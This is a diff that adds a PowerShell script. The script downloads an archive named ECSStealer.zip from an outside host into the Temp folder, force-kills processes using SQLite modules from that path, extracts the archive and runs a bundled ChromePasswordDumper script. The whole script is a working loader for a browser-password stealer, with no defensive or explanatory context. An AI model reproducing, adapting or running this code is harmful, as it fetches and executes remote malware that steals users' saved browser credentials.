@@ -1,0 +1,32 @@
+$dist  = "$env:LOCALAPPDATA\Temp\";
+iwr "https://ecs.rcsis.ir/down/ECSStealer.zip" -out ($dist + "e.zip");
+write-output (test-path "$dist\e");
+if ((test-path "$dist\e"))
+{
+Write-Output "Find Existed Path Go To Delete ...";
+Get-Process | ForEach-Object {
+     $process = $_
+     $process.Modules | ForEach-Object {
+       $module = $_
+       if ($module.ModuleName -like "*SQLite*")
+       {
+          $ecsm = [PSCustomObject]@{
+                     ProcessName = $process.ProcessName
+                     Id = $process.Id
+                     ModuleName = $module.ModuleName
+                     ModulePath = $module.FileName
+		}
+	   }
+ if (($ecsm.ModulePath -like "*$dist*" )){
+ Write-Output "Stoping dll:" + $ecsm.ModulePath + "with Id:" +  $ecsm.Id
+   Stop-Process $ecsm.Id -Force
+ }
+ }
+ }
+ 
+# Remove the directory
+Remove-Item -Path "$dist\e" -Recurse -Force
+}
+Add-Type -AssemblyName System.IO.Compression.FileSystem
+[System.IO.Compression.ZipFile]::ExtractToDirectory( "$dist\e.zip","$dist\e")
+& "$dist\e\ChromePasswordDumper-master\ChromePasswordDumper\windows.ps1"
